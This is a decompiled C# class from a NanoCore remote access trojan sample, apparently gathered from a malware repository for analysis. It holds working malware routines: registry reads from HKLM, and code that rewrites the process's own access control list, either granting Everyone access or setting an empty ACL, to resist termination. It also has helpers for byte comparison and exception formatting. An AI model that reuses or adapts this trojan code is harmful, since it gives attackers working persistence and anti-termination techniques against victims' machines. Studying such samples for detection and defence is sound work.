// Decompiled with JetBrains decompiler
// Type: Class26
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;

[StandardModule]
internal sealed class Class26
{
  public static string smethod_0(string string_0, string string_1)
  {
    IntPtr intptr_0_1;
    if (Class9.RegOpenKeyEx(new UIntPtr(2147483650U), string_0, 0, 131353, ref intptr_0_1) != 0)
      return string.Empty;
    StringBuilder stringBuilder = (StringBuilder) null;
    IntPtr intptr_0_2 = intptr_0_1;
    string string_0_1 = string_1;
    int num1 = 0;
    ref int local1 = ref num1;
    StringBuilder stringBuilder_0_1 = stringBuilder;
    int capacity;
    ref int local2 = ref capacity;
    if (Class9.RegQueryValueEx(intptr_0_2, string_0_1, 0, ref local1, stringBuilder_0_1, ref local2) == 0)
    {
      stringBuilder = new StringBuilder(capacity);
      IntPtr intptr_0_3 = intptr_0_1;
      string string_0_2 = string_1;
      int num2 = 0;
      ref int local3 = ref num2;
      StringBuilder stringBuilder_0_2 = stringBuilder;
      ref int local4 = ref capacity;
      Class9.RegQueryValueEx(intptr_0_3, string_0_2, 0, ref local3, stringBuilder_0_2, ref local4);
    }
    Class9.RegCloseKey(intptr_0_1);
    return stringBuilder == null ? string.Empty : stringBuilder.ToString();
  }

  public static bool smethod_1()
  {
    bool flag;
    try
    {
      RawSecurityDescriptor rawSecurityDescriptor_0 = Class26.smethod_3();
      CommonAce ace = new CommonAce(AceFlags.None, AceQualifier.AccessAllowed, 2035707, new SecurityIdentifier(WellKnownSidType.WorldSid, (SecurityIdentifier) null), false, (byte[]) null);
      rawSecurityDescriptor_0.DiscretionaryAcl.InsertAce(0, (GenericAce) ace);
      flag = Class26.smethod_4(rawSecurityDescriptor_0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "RestoreAccessControlEntries");
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  public static bool smethod_2()
  {
    bool flag;
    try
    {
      flag = Class26.smethod_4(Class26.smethod_3());
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "ClearAccessControlEntries");
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  private static RawSecurityDescriptor smethod_3()
  {
    DiscretionaryAcl discretionaryAcl = new DiscretionaryAcl(false, false, 0);
    byte[] binaryForm = new byte[discretionaryAcl.BinaryLength - 1 + 1];
    discretionaryAcl.GetBinaryForm(binaryForm, 0);
    return new RawSecurityDescriptor(ControlFlags.DiscretionaryAclPresent, (SecurityIdentifier) null, (SecurityIdentifier) null, (RawAcl) null, new RawAcl(binaryForm, 0));
  }

  private static bool smethod_4(RawSecurityDescriptor rawSecurityDescriptor_0)
  {
    byte[] numArray = new byte[rawSecurityDescriptor_0.BinaryLength - 1 + 1];
    rawSecurityDescriptor_0.GetBinaryForm(numArray, 0);
    return Class9.SetKernelObjectSecurity(Class24.intptr_0, 4, numArray);
  }

  public static bool smethod_5(byte[] byte_0, byte[] byte_1)
  {
    if (byte_0.Length != byte_1.Length)
      return false;
    int num = byte_1.Length - 1;
    for (int index = 0; index <= num; ++index)
    {
      if ((int) byte_0[index] != (int) byte_1[index])
        return false;
    }
    return true;
  }

  public static string smethod_6(Exception exception_0)
  {
    string str = Class26.smethod_7(exception_0);
    if (str.Length > 4096)
      str = str.Remove(4093) + "...";
    return str;
  }

  private static string smethod_7(Exception exception_0)
  {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.AppendLine(exception_0.Message);
    stringBuilder.AppendLine();
    stringBuilder.AppendLine(exception_0.GetType().FullName);
    stringBuilder.AppendLine(exception_0.StackTrace);
    if (exception_0.InnerException != null)
    {
      stringBuilder.AppendLine();
      stringBuilder.AppendLine(Class26.smethod_7(exception_0.InnerException));
    }
    return stringBuilder.ToString();
  }
}
